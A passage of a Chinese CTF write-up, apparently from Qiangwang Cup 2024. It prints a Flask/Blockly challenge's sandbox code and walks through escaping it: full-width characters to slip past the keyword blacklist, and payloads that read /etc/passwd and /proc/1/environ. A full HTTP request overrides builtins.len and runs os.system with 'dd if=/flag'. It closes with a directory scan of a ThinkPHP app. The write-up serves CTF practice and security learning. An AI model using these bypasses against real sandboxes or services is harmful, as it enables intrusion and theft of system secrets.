</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>+=</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>block</span><span class=p>)</span><span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>code</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>json_to_python</span><span class=p>(</span><span class=n>blockly_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>block</span> <span class=o>=</span> <span class=n>blockly_data</span><span class=p>[</span><span class=s1>&#39;blocks&#39;</span><span class=p>][</span><span class=s1>&#39;blocks&#39;</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>python_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>python_code</span> <span class=o>+=</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>block</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>python_code</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>do</span><span class=p>(</span><span class=n>source_code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hook_code</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>def my_audit_hook(event_name, arg):
</span></span></span><span class=line><span class=cl><span class=s1>    blacklist = [&#34;popen&#34;, &#34;input&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;compile&#34;, &#34;memoryview&#34;]
</span></span></span><span class=line><span class=cl><span class=s1>    if len(event_name) &gt; 4:
</span></span></span><span class=line><span class=cl><span class=s1>        raise RuntimeError(&#34;Too Long!&#34;)
</span></span></span><span class=line><span class=cl><span class=s1>    for bad in blacklist:
</span></span></span><span class=line><span class=cl><span class=s1>        if bad in event_name:
</span></span></span><span class=line><span class=cl><span class=s1>            raise RuntimeError(&#34;No!&#34;)
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>__import__(&#39;sys&#39;).addaudithook(my_audit_hook)
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>source_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=n>hook_code</span> <span class=o>+</span> <span class=n>source_code</span>
</span></span><span class=line><span class=cl>    <span class=n>tree</span> <span class=o>=</span> <span class=nb>compile</span><span class=p>(</span><span class=n>source_code</span><span class=p>,</span> <span class=s2>&#34;run.py&#34;</span><span class=p>,</span> <span class=s1>&#39;exec&#39;</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>ast</span><span class=o>.</span><span class=n>PyCF_ONLY_AST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>verify_secure</span><span class=p>(</span><span class=n>tree</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;run.py&#34;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>        
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;python&#39;</span><span class=p>,</span> <span class=s1>&#39;run.py&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=s1>&#39;run.py&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;Execution aborted due to security concerns.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=s1>&#39;run.py&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Timeout!&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>app</span><span class=o>.</span><span class=n>send_static_file</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/blockly_json&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>blockly_json</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>blockly_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_data</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>type</span><span class=p>(</span><span class=n>blockly_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>blockly_data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>blockly_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>blockly_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>python_code</span> <span class=o>=</span> <span class=n>json_to_python</span><span class=p>(</span><span class=n>blockly_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>do</span><span class=p>(</span><span class=n>python_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;Error generating Python code&#34;</span><span class=p>,</span> <span class=s2>&#34;details&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>首先一进来这个黑名单过滤了很多符号(所有)，除了空格大小写字母数字</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>module_exists</span><span class=p>(</span><span class=n>module_name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>spec</span> <span class=o>=</span> <span class=n>importlib</span><span class=o>.</span><span class=n>util</span><span class=o>.</span><span class=n>find_spec</span><span class=p>(</span><span class=n>module_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>spec</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>module_name</span> <span class=ow>in</span> <span class=n>sys</span><span class=o>.</span><span class=n>builtin_module_names</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>spec</span><span class=o>.</span><span class=n>origin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>std_lib_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=vm>__file__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>spec</span><span class=o>.</span><span class=n>origin</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>std_lib_path</span><span class=p>)</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>spec</span><span class=o>.</span><span class=n>origin</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span></code></pre></td></tr></table></div></div><p>判断函数是否为内置模块，如果为自定义模块则返回<code>False</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>verify_secure</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>node</span> <span class=ow>in</span> <span class=n>ast</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>match</span> <span class=nb>type</span><span class=p>(</span><span class=n>node</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=n>ast</span><span class=o>.</span><span class=n>Import</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ERROR: Banned module &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=n>ast</span><span class=o>.</span><span class=n>ImportFrom</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ERROR: Banned module </span><span class=si>{</span><span class=n>node</span><span class=o>.</span><span class=n>module</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span></code></pre></td></tr></table></div></div><p>判断是否有导入语句，<code>AST</code>为一个标准库</p><p>然后就是两个来进行代码处理的函数，重点是这里</p><p><img src=/p/qiangwang-cup-2024/QQ20241102-202753.png width=1759 height=723 loading=lazy alt=1></p><p>进行了代码的执行，其中我们绕过关键词即可，现在的问题就是插入恶意代码以及绕过了</p><p>现在我们知道发包的格式类似于这种</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  &#34;blocks&#34;: {
</span></span><span class=line><span class=cl>    &#34;languageVersion&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;blocks&#34;: [
</span></span><span class=line><span class=cl>      {
</span></span><span class=line><span class=cl>        &#34;type&#34;: &#34;print&#34;,
</span></span><span class=line><span class=cl>        &#34;id&#34;: &#34;1&#34;,
</span></span><span class=line><span class=cl>        &#34;inputs&#34;: {
</span></span><span class=line><span class=cl>          &#34;TEXT&#34;: {
</span></span><span class=line><span class=cl>            &#34;block&#34;: {
</span></span><span class=line><span class=cl>              &#34;type&#34;: &#34;text&#34;,
</span></span><span class=line><span class=cl>              &#34;id&#34;: &#34;2&#34;,
</span></span><span class=line><span class=cl>              &#34;fields&#34;: {
</span></span><span class=line><span class=cl>                &#34;TEXT&#34;: &#34;Hello, World!&#34;
</span></span><span class=line><span class=cl>              }
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>          }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>    ]
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>但是读取文件这里又卡住了，这里不让有的关键词如何绕过，还有就是文件读取命令使用什么</p><p>后面查看自己的CTFshow之前的记录发现可以使用半角符号来绕过关键词，读取命令用这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# dd if=/flag
</span></span><span class=line><span class=cl>flag{I_love_Yo3}
</span></span><span class=line><span class=cl>0+1 records in
</span></span><span class=line><span class=cl>0+1 records out
</span></span><span class=line><span class=cl>17 bytes copied, 3.9533e-05 s, 430 kB/s
</span></span></code></pre></td></tr></table></div></div><p>但是后面发现这个payload我这么写都写不好，八进制绕过给我爆500，然后上网搜索有没有内置的读取文件的<strong>Flask中内置的读取文件方法</strong></p><p>找到<code>get_data</code>方法</p><p>转半角脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>half2full</span><span class=p>(</span><span class=n>half</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>full</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>half</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>33</span><span class=p>,</span> <span class=mi>127</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>ch</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0xfee0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=o>==</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ch</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=mh>0x3000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=n>full</span> <span class=o>+=</span> <span class=n>ch</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>full</span>
</span></span><span class=line><span class=cl><span class=n>t</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>s</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>+=</span><span class=n>half2full</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  &#34;blocks&#34;: {
</span></span><span class=line><span class=cl>    &#34;blocks&#34;: [
</span></span><span class=line><span class=cl>      {
</span></span><span class=line><span class=cl>        &#34;type&#34;: &#34;print&#34;,
</span></span><span class=line><span class=cl>        &#34;inputs&#34;: {
</span></span><span class=line><span class=cl>          &#34;TEXT&#34;: {
</span></span><span class=line><span class=cl>            &#34;block&#34;: {
</span></span><span class=line><span class=cl>              &#34;type&#34;: &#34;text&#34;,
</span></span><span class=line><span class=cl>              &#34;fields&#34;: {
</span></span><span class=line><span class=cl>                &#34;TEXT&#34;: &#34;123‘，ｇｅｔａｔｔｒ（＂＂．＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅｓ＿＿．＿＿ｇｅｔｉｔｅｍ＿＿（０）．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）［１２１］， ＂ｇｅｔ＿ｄａｔａ＂）（１， ＂／ｅｔｃ／ｐａｓｓｗｄ＂），’&#34;
</span></span><span class=line><span class=cl>              }
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>          }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>    ]
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  &#34;blocks&#34;: {
</span></span><span class=line><span class=cl>    &#34;blocks&#34;: [
</span></span><span class=line><span class=cl>      {
</span></span><span class=line><span class=cl>        &#34;type&#34;: &#34;print&#34;,
</span></span><span class=line><span class=cl>        &#34;inputs&#34;: {
</span></span><span class=line><span class=cl>          &#34;TEXT&#34;: {
</span></span><span class=line><span class=cl>            &#34;block&#34;: {
</span></span><span class=line><span class=cl>              &#34;type&#34;: &#34;text&#34;,
</span></span><span class=line><span class=cl>              &#34;fields&#34;: {
</span></span><span class=line><span class=cl>                &#34;TEXT&#34;: &#34;123‘，ｇｅｔａｔｔｒ（＂＂．＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅｓ＿＿．＿＿ｇｅｔｉｔｅｍ＿＿（０）．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）［１２１］， ＂ｇｅｔ＿ｄａｔａ＂）（１， ＂／ｐｒｏｃ／１／ｅｎｖｉｒｏｎ＂），’&#34;
</span></span><span class=line><span class=cl>              }
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>          }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>    ]
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>还是搞不到，难道还是要命令执行才可以吗</p><p>题目中说了<code>len</code>不能超过4，这里直接重写<code>len</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /blockly_json HTTP/1.1
</span></span><span class=line><span class=cl>Host: eci-2zefm3fmppqf7kdz1ghu.cloudeci1.ichunqiu.com:5000
</span></span><span class=line><span class=cl>Content-Length: 317
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Origin: http://eci-2zefm3fmppqf7kdz1ghu.cloudeci1.ichunqiu.com:5000
</span></span><span class=line><span class=cl>Referer: http://eci-2zefm3fmppqf7kdz1ghu.cloudeci1.ichunqiu.com:5000/
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1728270163,1728484327,1728520102,1728911088
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;blocks&#34;:{&#34;languageVersion&#34;:0,&#34;blocks&#34;:[{&#34;type&#34;:&#34;text&#34;,&#34;id&#34;:&#34;Yl.b$Wv5$31H:nQG/2fi&#34;,&#34;x&#34;:0,&#34;y&#34;:181,&#34;fields&#34;:{&#34;TEXT&#34;:&#34;‘；＿＿import＿＿（”builtins”）。len＝lambda a：4；’‘；＿＿import＿＿（”os”）。system（”＄（printf ‘ｄｄ　ｉｆ＝／ｆｌａｇ’）； ”）；’&#34;}}]}}
</span></span></code></pre></td></tr></table></div></div><h2 id=xiaohuanxiong>xiaohuanxiong</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>V5.1.35 LTS { 十年磨一剑-为API开发设计的高性能框架 }
</span></span></code></pre></td></tr></table></div></div><p>是一个tp，进来之后先安装，然后等待一会儿，管他的先扫吧</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[10:09:00] 200 -    1KB - /admin/login                                      
</span></span><span class=line><span class=cl>[10:09:00] 200 -    1KB - /admin/login.html                                 
</span></span><span class=line><span class=cl>[10:09:00] 200 -    1KB - /Admin/login/
</span></span><span class=line><span class=cl>[10:14:20] 200 -    1KB - /login                                            
</span></span><span class=line><span class=cl>[10:14:21] 200 -    1KB - /login.html                                       
</span></span><span class=line><span class=cl>[10:14:22] 200 -    1KB - /login/                                           
</span></span><span class=line><span class=cl>[10:14:22] 200 -    1KB - /login/admin/
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/admin/admin.asp                            
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/administrator/
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/cpanel.php
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/cpanel.aspx
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/cpanel.html
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/cpanel.jsp
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/cpanel.js
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/cpanel/
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/index
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/login
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/oauth/
</span></span><span class=line><span class=cl>[10:14:23] 200 -    1KB - /login/super
</span></span><span class=line><span class=cl>[10:14:29] 200 -  899B  - /logout                                           
</span></span><span class=line><span class=cl>[10:14:29] 200 -  899B  - /logout.html                                      
</span></span><span class=line><span class=cl>[10:14:29] 200 -  899B  - /logout/                                          
</span></span><span class=line><span class=cl>[10:15:29] 200 -    1KB - /register                                         
</span></span><span class=line><span class=cl>[10:15:29] 200 -    1KB - /register.html                                    
</span></span><span class=line><span class=cl>[10:15:30] 200 -   24B  - /robots.txt                                       
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search                                           
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search.php                                       
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search.js
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search.html
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search.aspx                                      
